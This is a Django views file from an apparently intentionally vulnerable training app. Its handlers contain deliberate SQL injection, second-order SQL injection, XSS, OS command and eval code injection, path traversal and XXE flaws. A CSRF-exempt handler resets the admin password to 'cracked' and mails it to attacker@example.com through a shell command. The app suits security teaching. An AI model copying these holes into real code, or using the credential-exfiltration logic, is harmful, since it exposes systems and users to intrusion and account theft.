import datetime
import logging
import os
import re
import shlex
import subprocess
import sys
import time
import traceback
import xml.sax
from time import sleep
from django import forms
from django.conf import settings
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.backends import UserModel
from django.db import transaction, connection, DatabaseError, OperationalError
from django.http import HttpResponse
from django.shortcuts import render, redirect
from django.utils.translation import gettext as _
from django.views.decorators.csrf import csrf_exempt

from .forms import UploadFileForm
from .models import User
from .uploadhandler import QuotaUploadHandler

# TODO change directory from "static" to another
UPLOAD_DIR = os.path.join(settings.BASE_DIR, "static", "uploadfiles")

# Dictionary for in-memory account locking
all_users_login_history = {}


def index(request):
    data = {
        'title': 'Djang5SCLab',
        'isOnlyVulnerabilities': settings.IS_ONLY_VULNERABILITIES,
    }
    if 'dlpinit' in request.session:
        del request.session['dlpinit']

    return render(request, 'index.html', data)


def ping(request):
    return HttpResponse("It works!")


# -----------------------------------------------------------------------
# Authentication filter function
def redirect_login(request):
    # Login (authentication) is needed to access admin pages (under /admins).
    target = request.path
    login_type = request.GET.get("logintype")
    query_string = request.META['QUERY_STRING']

    # Remove "login_type" parameter from query string.
    if login_type and query_string:
        query_string = query_string.replace(f"logintype={login_type}&", "")
        query_string = query_string.replace(f"&logintype={login_type}", "")
        query_string = query_string.replace(f"logintype={login_type}", "")
        if len(query_string) > 0:
            query_string = "?" + query_string

    # Not authenticated yet
    request.session['target'] = target

    if login_type is None:
        # TODO for session fixation
        # redirect(response.encodeRedirectURL("/login" + query_string))
        return redirect("/login" + query_string)

    # elif "sessionfixation".equals(login_type):
    #    redirect(response.encodeRedirectURL("/" + login_type + "/login" + query_string))
    else:
        return redirect(f"/{login_type}/login{query_string}")
# -----------------------------------------------------------------------


def main(request):
    if not request.user.is_authenticated:
        return redirect_login(request)
    data = {
        'title': _('title.adminmain.page'),
    }
    return render(request, 'adminmain.html', data)


def admins_logout(request):
    if request.user.is_authenticated:
        logout(request)
    return index(request)


def admins_login(request):
    if request.user.is_authenticated:
        return main(request)
    else:
        data = {
            'breadcrumbs_title': _('function.name.csrf'),
            'title': _('title.login.page'),
        }
        if request.method == 'GET':
            return render(request, 'login.html', data)
        elif request.method == 'POST':
            username = request.POST.get("username")
            password = request.POST.get("password")

            if is_account_lockedout(username):
                data['errmsg'] = _("msg.authentication.fail")
            else:
                user = authenticate(request, username=username, password=password)
                if user:
                    login(request, user)
                    # authentication succeeded, then reset account lock
                    reset_account_lock(username)
                    request.session["username"] = username
                    if 'target' not in request.session:
                        return main(request)
                    else:
                        target = request.session['target']
                        del request.session['target']
                        return redirect(target)
                else:
                    data['errmsg'] = _("msg.authentication.fail")

                # account lock count +1
                increment_account_lock_num(username)

        return render(request, 'login.html', data)


def db_user_list(request):
    data = {
        'breadcrumbs_title': _('function.name.database.user.list'),
        'title': _('title.dbuserlist.page'),
        'note': _('msg.note.dbuserlist'),
    }
    c = connection.cursor()
    try:
        c.execute("SELECT id, name, phone, mail FROM dsclab_user ORDER BY id asc")
        data['users'] = c.fetchall()
    except Exception as e:
        print(traceback.format_exc())
    finally:
        # c.close()
        pass
    return render(request, 'db_userlist.html', data)


def _423_sql_injection(request):
    data = {
        'breadcrumbs_title': _('function.name.sql.injection'),
        'title': _('title.sqlijc.page'),
        'note': _('msg.note.sqlijc'),
    }
    if request.method == 'POST':
        name = request.POST.get("name")
        password = request.POST.get("password")
        data['users'] = User.objects.raw(f"SELECT * FROM dsclab_user WHERE name='{name}' AND password='{password}' ORDER BY id")
        data['message'] = f"{len(list(data['users']))} 件見つかりました。"
    return render(request, '423_sql_injection.html', data)


def _442_second_order_sql_injection(request):
    data = {
        'breadcrumbs_title': _('function.name.secondorderijc'),
        'title': _('title.secondordersqlijc.page'),
        'note': _('msg.note.secondordersqlijc'),
    }
    if request.method == 'POST':
        name = request.POST.get("name").strip()
        password = request.POST.get("password").strip()
        secret = request.POST.get("secret").strip()
        if len(name) == 0 or len(password) == 0 or len(secret) == 0:
            data['error_message'] = '名前、パスワード、暗証番号は必須です。'
            return render(request, '442_second_order_sql_injection.html', data)
        phone = request.POST.get("phone")
        mail = request.POST.get("mail")
        user = User()
        user.name = name
        user.password = password
        user.secret = secret
        user.phone = phone
        user.mail = mail
        user.save()
        
        with connection.cursor() as cursor:
            cursor.execute("SELECT * FROM dsclab_user WHERE name = '{}'".format(name))
            user = cursor.fetchone()

        if user:
            data['message'] = f"{user[1]} さんのパスワードは {user[2]} 暗証番号は {user[3]} です。"
        else:
            data['message'] = 'ユーザが見つかりません。'

    return render(request, '442_second_order_sql_injection.html', data)


def _532_xss(request):
    data = {
        'breadcrumbs_title': _('function.name.xss'),
        'title': _('title.xss.page'),
        'msg': _('msg.enter.string'),
    }
    if request.method == 'POST':
        input_str = request.POST.get("string")
        if input_str and len(input_str) > 0:
            data['msg'] = input_str
    return render(request, '532_xss.html', data)


def _612_os_command_injection(request):
    data = {
        'breadcrumbs_title': _('function.name.os.command.injection'),
        'title': _('title.commandinjection.page'),
        'note': _('msg.note.commandinjection'),
    }
    if request.method == 'POST':
        command = request.POST.get("command")
        cmd = f'echo "Hello, " {command}'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            data['result'] = _('msg.echo.command.success')
            data['result'] += "\n\n" + result.stdout
        else:
            data['errmsg'] = _('msg.echo.command.failure')
            data['errmsg'] += "\n\n" + result.stderr
    return render(request, '612_os_command_injection.html', data)


def _642_code_injection(request):
    data = {
        'breadcrumbs_title': _('function.name.code.injection'),
        'title': _('title.codeinjection.page'),
        'note': _('msg.note.codeinjection'),
    }
    if request.method == 'POST':
        expression = request.POST.get('expression', '')
        if expression and len(expression) > 0:
            data['expression'] = expression
            expression = expression.replace("math", "__import__('math')")
            try:
                data['value'] = str(eval(expression))
            except Exception as e:
                print(traceback.format_exc())
                data['errmsg'] = _("msg.invalid.expression") % {"exception": e}
            finally:
                pass
    return render(request, '642_code_injection.html', data)


@csrf_exempt
def _712_csrf(request):
    if not request.user.is_authenticated:
        return redirect_login(request)
    data = {
        'breadcrumbs_title': _('function.name.csrf'),
        'title': _('title.csrf.page'),
        'note': _('msg.note.csrf'),
    }
    if request.method == 'POST' and "username" in request.session:
        username = request.session["username"]
        password = request.POST.get("password")
        try:
            from django.contrib.auth.models import User
            User.objects.filter(is_superuser=True)
            u = User.objects.get(username=username)
            u.set_password("cracked")  # パスワードを "cracked" に変更
            u.save()
            data['complete'] = True
            
            # 攻撃者にメールで通知
            subject = 'DSCLab.Admin.Password.Changed'
            message = f'Username: {username} Password: cracked'
            address = 'attacker@example.com'  # 攻撃者のメールアドレス
            cmd = 'echo ' + message + '| mail -s ' + subject + ' ' + address
            if os.system(cmd) == 0:
                data['result'] = _('msg.send.mail.success')
            else:
                data['errmsg'] = _('msg.send.mail.failure')

        except Exception as e:
            print(traceback.format_exc())
            data['errmsg'] = _('msg.passwd.change.failed')
    return render(request, '712_csrf.html', data)


def _812_path_traversal(request):
    data = {
        'breadcrumbs_title': _('function.name.pathtraversal'),
        'title': _('title.pathtraversal.page'),
        'note': _('msg.note.pathtraversal'),
    }
    filename = request.GET.get('filename')
    if filename:
        # 脆弱性のあるコード: ユーザ入力を直接パスに利用
        base_dir = os.path.join(settings.BASE_DIR, 'templates')
        filepath = os.path.join(base_dir, filename)
        try:
            with open(filepath, 'r') as f:
                content = f.read()  
                data['content'] = content  
                data['filepath'] = filepath  
        except FileNotFoundError:
            data['message'] = 'ファイルが見つかりません'
    return render(request, '812_path_traversal.html', data)


@csrf_exempt
def _822_xxe(request):
    request.upload_handlers.insert(0, QuotaUploadHandler())
    data = {
        'breadcrumbs_title': _('function.name.xxe'),
        'title': _('title.xxe.page'),
        'note': _('msg.note.xxe'),
    }
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            uploaded_file = request.FILES['file']
            content_type = uploaded_file.content_type
            if content_type == "text/xml":
                str_text = ''
                for line in uploaded_file:
                    str_text = str_text + line.decode()
                obj = MyObject()
                parser = MySaxContentHandler(obj)
                xml.sax.parseString(str_text, parser)
                data['results'] = parser.results
            else:
                data['errmsg'] = _('msg.not.xml.file')
    else:
        form = UploadFileForm()
    data['form'] = form
    return render(request, '822_xxe.html', data)


# -------- private method
def increment_account_lock_num(username):
    if username in all_users_login_history:
        user_login_history = all_users_login_history[username]
        user_login_history[0] = user_login_history[0] + 1
        user_login_history[1] = datetime.datetime.now()
    else:
        user_login_history = [1, datetime.datetime.now()]
        all_users_login_history[username] = user_login_history


def reset_account_lock(username):
    all_users_login_history[username] = [0, None]


def is_account_lockedout(username):
    if username is None or username not in all_users_login_history:
        return False
    user_login_history = all_users_login_history[username]
    return user_login_history[1] and settings.ACCOUNT_LOCK_COUNT <= user_login_history[0] and ((datetime.datetime.now() - user_login_history[1]).seconds < settings.ACCOUNT_LOCK_TIME)


def is_user_exist(username):
    from django.contrib.auth.models import User
    if User.objects.filter(username=username).exists():
        return True
    return False


class MyObject:

    def __init__(self):
        self.id = None
        self.name = None
        self.phone = None
        self.mail = None

    def __repr__(self):
        return f"{self.id} ({self.name}, {self.phone}, {self.mail})"


class MySaxContentHandler(xml.sax.ContentHandler):

    def __init__(self, object):
        xml.sax.ContentHandler.__init__(self)
        self.object = object
        self.results = []

    def startElement(self, name, attrs):
        self.chars = ""

    def endElement(self, name):
        if name == "id":
            self.object.id = self.chars
        elif name == "name":
            self.object.name = self.chars
        elif name == "phone":
            self.object.phone = self.chars
        elif name == "mail":
            self.object.mail = self.chars
        elif name == "person":
            if self.object.id is not None:
                try:
                    user = User.objects.get(id=self.object.id)
                    user.name = self.object.name
                    user.phone = self.object.phone
                    user.mail = self.object.mail
                    user.save()
                    print(f"{self.object.id} is updated.")
                    self.results.append(f"{self.object.id} is updated.")
                except User.DoesNotExist:
                    print(f"{self.object.id} does not exist.")
                    self.results.append(f"{self.object.id} does not exist.")
                except DatabaseError as db_err:
                    print(f'DatabaseError occurs: {db_err}')
                    raise db_err
                except Exception as e:
                    print(traceback.format_exc())
                    raise e

    def characters(self, content):
        self.chars += content
